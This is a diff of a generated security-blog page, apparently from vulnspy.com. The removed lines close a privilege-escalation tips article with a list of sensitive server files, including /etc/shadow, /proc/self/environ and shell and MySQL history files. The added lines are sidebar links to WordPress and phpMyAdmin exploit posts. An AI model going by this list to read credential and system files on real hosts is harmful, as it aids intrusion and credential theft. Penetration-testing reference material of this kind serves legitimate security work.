-<li>/apps/apache/conf/httpd.conf</li>
-<li>/apps/apache2/conf/httpd.conf</li>
-<li>/etc/httpd/conf.d/vhosts.conf</li>
-</ul>
-</li>
-<li>PHP INI<ul>
-<li>/etc/php.ini</li>
-<li>/etc/php/7.0/cli/php.ini</li>
-<li>/etc/php/7.0/fpm/php.ini</li>
-<li>/etc/php5/apache2/php.ini</li>
-<li>/etc/php5/cli/php.ini</li>
-<li>/usr/local/php/etc/php.ini</li>
-<li>/usr/local/Zend/etc/php.ini</li>
-<li>/usr/local/php/lib/php.ini</li>
-</ul>
-</li>
-<li>OTHER<ul>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-<li>/etc/group</li>
-<li>/etc/gshadow</li>
-<li>/etc/rc.local</li>
-<li>/etc/issue</li>
-<li>/etc/issue.net</li>
-<li>/proc/version</li>
-<li>/proc/self/environ</li>
-<li>/etc/sysconfig/network-scripts/ifcfg-eth0</li>
-<li>/etc/init.d/httpd</li>
-<li>/etc/init.d/mysqld</li>
-<li>/etc/syslog.conf</li>
-<li>/var/log/yum.log</li>
-<li>/etc/sysconfig/iptables-config</li>
-<li>/var/log/cron</li>
-<li>.bash_history</li>
-<li>.mysql_history</li>
-<li>.viminfo</li>
-<li>/etc/vsftpd/vsftpd.conf</li>
-<li>/etc/logrotate.d/vsftpd.log</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/08/02/Local-Privilege-Escalation-Tips/" data-id="cjintzy4z0000nzpvql6j6z9k" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+  </nav>
 </section>
         
           <aside id="sidebar">
@@ -1076,6 +937,14 @@
       <ul>
         
           <li>
+            <a href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/">Wordpress &lt;= 4.9.6 任意文件删除漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/">Wordpress &lt;= 4.9.6 Arbitrary File Delection Vulnerbility Exploit</a>
+          </li>
+        
+          <li>
             <a href="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/">phpMyAdmin 4.8.x 本地文件包含漏洞利用</a>
           </li>
         
@@ -1085,14 +954,6 @@
         
           <li>
             <a href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/">phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/">phpMyAdmin 4.7.x CSRF 漏洞利用</a>
-          </li>
-        
-          <li>
-            <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
           </li>
         
       </ul>
